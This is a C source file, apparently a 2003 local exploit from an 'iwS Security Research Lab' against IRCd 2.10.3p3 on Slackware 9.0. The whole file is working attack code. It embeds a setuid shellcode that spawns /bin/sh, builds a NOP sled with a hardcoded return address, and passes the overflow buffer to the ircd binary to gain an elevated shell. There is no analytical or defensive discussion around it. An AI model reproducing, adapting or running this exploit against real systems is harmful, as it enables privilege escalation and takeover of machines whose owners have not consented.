/* 2003 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <getopt.h>
#include <sys/errno.h>

#define NOP     0x90

/* struttura dei targets */
struct  target
{
    int     index;
    char    *distro;
    u_long  retaddr;
    int     LEN;
};

/* targets */
struct  target exploit[] =
{
    { 1, "Slackware 9.0", 0xbffff4fc, 2000},       /* added by Monchan */
    { 0, NULL, 0, 0 }
};

/* 56 bytes setuid\setgid shellcode */
u_char  shellcode[] =
    "\x31\xc9\x31\xdb\x89\xc8\xb0\x46\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31"
    "\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c"
    "\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";

void    usage(char *cmd)
{
    fprintf(stderr, "\n[*] ./iwS Security Research Lab\n"
                    " + Deamon: IRCd 2.10.3p3\n"
                    " + Greets: #iwSpub @IRCnet\n\n"
                    "[?] usage: %s [-h] -t <num> [-o offset]\n"
                    "[?] options:\t-h\t: this help\n"
                    "\t\t-t num\t: choose target (0 for list)\n"
                    "\t\t-o off\t: set offset\n\n", cmd);
}

int     main(int argc, char *argv[])
{
    int     i, type, size;
    char    options, buffer[1108];
    u_long  retaddr, offset;

    offset  = 0;

    if(argc == 1)
    {
            usage(argv[0]);
            exit(0);
    }

    while((options = getopt(argc, argv, "ht:o:")) != EOF)
    {
        switch(options)
        {
            case 'h':usage(argv[0]); exit(0);
            case 't':type = atoi(optarg);

                    if(type > 1 || type < 0)
                    {
                        fprintf(stderr, "No Target\n\n");
                        exit(0);
                    }
                    if(type == 0)
                    {
                        usage(argv[0]);
                        printf("num . description\n"
                               "----+---------------\n");
                        for(i = 0; exploit[i].distro; i++)
                            fprintf(stderr, "[%d] | %s\n", exploit[i].index, exploit[i].distro);
                        fprintf(stderr, "\n");
                        exit(1);
                    }
                    break;

            case 'o':offset = atoi(optarg); break;
            default:usage(argv[0]); exit(0);
        }
    }

    size    = exploit[type-1].LEN;
    if(offset != 0) retaddr = (exploit[type-1].retaddr - offset);
    else retaddr = exploit[type-1].retaddr;

    fprintf(stderr, "\n[*] ./iwS Security Research Lab\n"
                    " + Deamon: IRCd 2.10.3p3\n"
                    " + Greets: #iwSpub @IRCnet\n\n"
                    "[!] Attacking: %s\n"
                    "[!] Return Address: %#x\n"
                    "[@] Spawning Shell...\n", exploit[type-1].distro, retaddr);

    for(i = 0; i < size; i += 4) *(long *) &buffer[i] = retaddr;
    for(i = 0; i < size / 2; i++) buffer[i] = NOP;
    memcpy(buffer + 1, shellcode, strlen(shellcode));
    buffer[size-1] = '\0';

    execl("./ircd", "ircd", "-T", buffer, NULL);

    return 0;
}

